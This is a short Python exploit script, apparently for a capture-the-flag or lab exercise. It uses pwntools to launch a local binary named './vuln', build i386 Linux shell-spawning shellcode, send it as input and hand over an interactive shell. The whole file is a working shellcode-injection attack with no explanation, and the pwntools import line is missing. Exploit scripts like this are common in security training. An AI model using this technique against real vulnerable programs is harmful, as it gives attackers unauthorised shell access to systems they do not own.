#!/usr/bin/python

p = process('./vuln')

shellcode = asm(shellcraft.i386.linux.sh())

p.sendline(shellcode)

p.interactive()